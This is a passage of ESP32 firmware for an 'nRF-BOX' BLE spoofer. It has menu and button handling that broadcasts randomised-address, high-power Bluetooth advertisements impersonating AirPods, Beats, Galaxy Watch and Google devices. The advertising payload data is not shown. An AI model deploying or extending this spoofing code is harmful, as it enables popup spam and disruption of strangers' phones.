        drawMarqueeStr(5 + xshift, 26, 114, 7, deviceText.c_str(), deviceSelectTime);
      } else if (i == 1) {
        u8g2.drawStr(81 + xshift, 43, advTypes[advType - 1]);
      } else {
        u8g2.setCursor(81 + xshift, 57);
        u8g2.print(isAdvertising ? "K.Hoat" : "Vo hieu");
      }
    }
    u8g2.drawHLine(0, 0, 4); u8g2.drawVLine(0, 0, 4);
    u8g2.drawHLine(124, 0, 4); u8g2.drawVLine(127, 0, 4);
    u8g2.drawHLine(0, 63, 4); u8g2.drawVLine(0, 60, 4);
    u8g2.drawHLine(124, 63, 4); u8g2.drawVLine(127, 60, 4);
    u8g2.sendBuffer();
  }

  void Airpods() { device_index = 0; }
  void Airpods_pro() { device_index = 1; }
  void Airpods_Max() { device_index = 2; }
  void Airpods_Gen_2() { device_index = 3; }
  void Airpods_Gen_3() { device_index = 4; }
  void Airpods_Pro_Gen_2() { device_index = 5; }
  void Power_Beats() { device_index = 6; }
  void Power_Beats_Pro() { device_index = 7; }
  void Beats_Solo_Pro() { device_index = 8; }
  void Beats_Studio_Buds() { device_index = 9; }
  void Beats_Flex() { device_index = 10; }
  void Beats_X() { device_index = 11; }
  void Beats_Solo_3() { device_index = 12; }
  void Beats_Studio_3() { device_index = 13; }
  void Beats_Studio_Pro() { device_index = 14; }
  void Beats_Fit_Pro() { device_index = 15; }
  void Beats_Studio_Buds_Plus() { device_index = 16; }
  void Galaxy_Watch_4() { device_index = 0; }
  void Galaxy_Watch_5() { device_index = 1; }
  void Galaxy_Watch_6() { device_index = 2; }
  void Google_Smart_Ctrl() { device_index = 0; } 

  void setAdvertisingData() {
    switch (deviceType) {
      case 1: Airpods(); break;
      case 2: Airpods_pro(); break;
      case 3: Airpods_Max(); break;
      case 4: Airpods_Gen_2(); break;
      case 5: Airpods_Gen_3(); break;
      case 6: Airpods_Pro_Gen_2(); break;
      case 7: Power_Beats(); break;
      case 8: Power_Beats_Pro(); break;
      case 9: Beats_Solo_Pro(); break;
      case 10: Beats_Studio_Buds(); break;
      case 11: Beats_Flex(); break;
      case 12: Beats_X(); break;
      case 13: Beats_Solo_3(); break;
      case 14: Beats_Studio_3(); break;
      case 15: Beats_Studio_Pro(); break;
      case 16: Beats_Fit_Pro(); break;
      case 17: Beats_Studio_Buds_Plus(); break;
      case 18: Galaxy_Watch_4(); break;
      case 19: Galaxy_Watch_5(); break;
      case 20: Galaxy_Watch_6(); break;
      case 21: Google_Smart_Ctrl(); break;
      default: Airpods(); break;
    }
  }

  void toggleAdvertising() {
    isAdvertising = !isAdvertising;

    if (!isAdvertising) {
      pAdvertising->stop();
      Serial.println("Quang cao da dung.");
    } else {
      esp_bd_addr_t dummy_addr = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
      }
      BLEAdvertisementData oAdvertisementData = getAdvertisementData();
      pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
      pAdvertising->addServiceUUID(devices_uuid);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->setMinInterval(0x20); // 32.5ms
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);
      pAdvertising->start();
      Serial.println("Quangda duoc kich hoat.");
    }
    updateDisplay();
  }

  void changeDeviceTypeNext() {
    deviceType = (deviceType % deviceCount) + 1;
    deviceSelectTime = millis();
    Serial.println("Device Type: " + String(deviceNames[deviceType - 1]));
    setAdvertisingData();
    updateDisplay();
  }

  void changeDeviceTypePrev() {
    deviceType = (deviceType - 2 + deviceCount) % deviceCount + 1;
    deviceSelectTime = millis();
    Serial.println("Device Type: " + String(deviceNames[deviceType - 1]));
    setAdvertisingData();
    updateDisplay();
  }

  void changeAdvTypeNext() {
    advType = (advType % advTypeCount) + 1;
    Serial.println("Adv Type: " + String(advTypes[advType - 1]));
    updateDisplay();
  }

  void changeAdvTypePrev() {
    advType = (advType - 2 + advTypeCount) % advTypeCount + 1;
    Serial.println("Adv Type: " + String(advTypes[advType - 1]));
    updateDisplay();
  }

  void navigateUp() {
    menuIndex = (menuIndex - 1 + menuSize) % menuSize;
    Serial.println("Navigate Up: menuIndex=" + String(menuIndex));
    updateDisplay();
  }

  void navigateDown() {
    menuIndex = (menuIndex + 1) % menuSize;
    Serial.println("Navigate Down: menuIndex=" + String(menuIndex));
    updateDisplay();
  }

  void changeOptionRight() {
    if (menuIndex == 0) changeDeviceTypeNext();
    else if (menuIndex == 1) changeAdvTypeNext();
    else toggleAdvertising();
  }

  void changeOptionLeft() {
    if (menuIndex == 0) changeDeviceTypePrev();
    else if (menuIndex == 1) changeAdvTypePrev();
    else toggleAdvertising();
  }

  void handleButtonPress(int pin, unsigned long &lastDebounceTime, void (*callback)()) {
    if (digitalRead(pin) == LOW) {
      unsigned long currentTime = millis();
      if ((currentTime - lastDebounceTime) > debounceDelay) {
        Serial.println("Button press: Pin=" + String(pin));
        callback();
        lastDebounceTime = currentTime;
      }
    }
  }

  void spooferSetup() {
    Serial.begin(115200);
    
    randomSeed(analogRead(0));
    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
    pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
    pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_PIN_LEFT, INPUT_PULLUP);

    BLEDevice::init("nRF-BOX");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); // +9dBm
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);

    deviceSelectTime = millis();
    updateDisplay();

    setNeoPixelColour("null");
  }

  void spooferLoop() {
    handleButtonPress(BUTTON_UP_PIN, lastDebounceTimeUp, navigateUp);
    handleButtonPress(BUTTON_DOWN_PIN, lastDebounceTimeDown, navigateDown);
    handleButtonPress(BTN_PIN_RIGHT, lastDebounceTimeRight, changeOptionRight);
    handleButtonPress(BTN_PIN_LEFT, lastDebounceTimeLeft, changeOptionLeft);

    u8g2.setFont(u8g2_font_5x7_tf);
    String deviceText = String("[ ") + String(deviceNames[deviceType - 1]) + String(" ]");
    if (u8g2.getUTF8Width(deviceText.c_str()) > 114) {
      updateDisplay();
    }

    delay(50);

    const char* color = "0";
    
    if (isAdvertising) {
      if (deviceType <= 17) color = "red"; // Apple
      else if (deviceType <= 20) color = "purple"; // Samsung
      else color = "green"; // Google
    }
    else if (!isAdvertising){color = "null";}
    
    setNeoPixelColour(color);
  }
}
